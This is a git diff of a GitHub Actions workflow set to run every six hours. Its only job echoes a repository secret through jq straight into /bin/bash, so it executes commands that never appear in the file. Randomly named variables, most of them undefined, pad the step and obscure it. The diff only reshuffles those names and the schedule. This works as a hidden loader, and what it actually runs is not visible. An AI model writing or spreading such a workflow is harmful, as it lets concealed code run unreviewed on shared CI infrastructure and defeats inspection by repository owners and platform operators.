@@ -3,8 +3,7 @@ name: pengzhongzhou2013
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 3/6 * * *'
-
+    - cron: '12 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,18 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: pengzhongzhou2013
         env:
-          ogozv67919: ${{ secrets.ogozv67919 }}
+          o1894: ${{ secrets.o1894 }}
         run: |
-          echo $ogozv67919 | jq -r .w38391 | /bin/bash
-          echo $ge4946 | jq -r .fo7 | /bin/bash
-          echo $ect793 | jq -r .k49 | /bin/bash
-          echo $endje9269 | jq -r .r69 | /bin/bash
-          echo $rwhpj46 | jq -r .pbgx69160 | /bin/bash
-          echo $wb8080 | jq -r .k264 | /bin/bash
-          echo $pzb972 | jq -r .soxd23955 | /bin/bash
-          echo $d467 | jq -r .ay954 | /bin/bash
-          echo $ae96526 | jq -r .zu93 | /bin/bash
-          echo $t496 | jq -r .qcbyr73 | /bin/bash
-          echo $hka018 | jq -r .jm1 | /bin/bash
-          echo $vcq425 | jq -r .vsr4417 | /bin/bash
+          echo $o1894 | jq -r .xg68095 | /bin/bash
+          echo $ckgfv16672 | jq -r .tjrfy96 | /bin/bash
+          echo $ajc68614 | jq -r .u0 | /bin/bash
+          echo $ntkm497 | jq -r .owfi398 | /bin/bash
+          echo $x266 | jq -r .kwzmm8 | /bin/bash
+          echo $ohty831 | jq -r .fe3 | /bin/bash
+          echo $ape29587 | jq -r .woh7 | /bin/bash
+          echo $shzqw806 | jq -r .rbkac29155 | /bin/bash
 
